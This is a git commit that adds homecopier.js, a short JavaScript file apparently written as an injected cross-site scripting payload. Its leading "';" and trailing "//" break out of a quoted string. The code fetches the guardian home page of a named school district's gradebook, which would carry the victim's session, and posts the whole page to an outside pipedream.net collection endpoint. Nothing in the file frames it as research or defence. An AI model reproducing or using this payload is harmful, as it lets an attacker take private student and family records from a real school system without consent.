8a7ba58c3cea27873a6c2ff21ef6c04daf1ac7aa
satturnn <112448699+satturnn@users.noreply.github.com>
2024-02-05 00:08:22 -0500

    Add files via upload

---
+++ homecopier.js
@@ -0,0 +1,35 @@
+';
+async function fetchData() {
+  try {
+    const response = await fetch("https://gradebook.milforded.org/guardian/home.html", {
+    });
+    const data = await response.text();
+    return data;
+  } catch (error) {
+    console.error("Error fetching data:", error);
+    throw error;
+  }
+}
+
+async function postData() {
+  try {
+    const data = await fetchData();
+    const headers = new Headers();
+    headers.append("Content-Type", "application/json");
+    const body = {
+      "test": data
+    };
+    const options = {
+      method: "POST",
+      headers,
+      mode: "cors",
+      body: JSON.stringify(body),
+    };
+
+    const postResponse = await fetch("https://eoy2w6d2or5iojc.m.pipedream.net", options);
+    console.log("Data posted successfully:", postResponse);
+  } catch (error) {
+    console.error("Error posting data:", error);
+  }
+}
+postData();//
